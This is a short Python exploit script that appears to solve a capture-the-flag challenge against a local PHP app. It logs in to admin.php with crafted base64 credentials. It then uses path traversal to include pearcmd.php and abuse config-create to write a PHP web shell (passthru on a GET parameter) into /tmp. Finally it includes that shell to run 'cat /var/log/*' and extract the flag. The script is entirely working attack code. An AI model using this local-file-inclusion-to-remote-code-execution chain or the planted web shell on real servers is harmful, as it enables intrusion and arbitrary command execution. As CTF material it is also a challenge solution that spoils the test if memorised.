import requests
from base64 import *
from pwn import *
import re

bdomain = "localhost"
bport = "3004"

burl = f"http://{bdomain}:{bport}"

sess = requests.session()

print('[+] Getting session')

res = sess.post(burl + "/admin.php", data={
    "username": 'Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6IAqChL826OS1WzX0J1k9hJZ22g0VVdg2D7Xwf+og==',
    "password": 'Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6ICqChL826OS1WzX0J1k9hJZ22g0dVdg2D7Xwf+og=='
})

print('[+] Creating malicious file')

r1 = remote(bdomain, bport)
r1.send(f"""GET /index.php?+config-create+/&page=../../../../../../../usr/local/lib/php/pearcmd.php&/<?=passthru($_GET[0]);?>+/tmp/test.php HTTP/1.1
Host: {bdomain}:{bport}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID={res.cookies.get("PHPSESSID")}
Connection: close

""".replace("\n","\r\n").encode())
r1.close()

print("[+] Getting flag: ")

print(re.findall("BKISC{.*}",sess.get(burl + '/index.php', params={
    "page":"../../../../../../../tmp/test.php",
    "0": "cat /var/log/*"
}).text)[0])